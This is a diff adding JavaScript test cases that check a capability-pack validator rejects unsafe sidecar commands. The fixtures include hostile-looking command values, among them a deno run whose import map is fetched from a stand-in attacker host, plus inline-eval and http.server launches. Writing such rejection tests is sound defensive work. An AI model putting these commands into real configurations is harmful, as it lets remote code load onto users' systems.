@@ -712,6 +712,15 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--import-map=https://attacker.example/map.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
         adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', '-e', 'console.log(1)'] },
         docs: [],
         checksums: [{ path: 'config.json', checksum: sidecarChecksum }],
@@ -1099,6 +1108,15 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [],
       }, {}),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['python', '-m', 'http.server', 'adapter.py'] },
+        docs: [],
+        checksums: [{ path: 'adapter.py', checksum: sidecarChecksum }],
+      }, { 'adapter.py': sidecar }),
       { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     const sidecarImport = fromUtf8("import './helper.mjs';\nconsole.log('ready');\n");
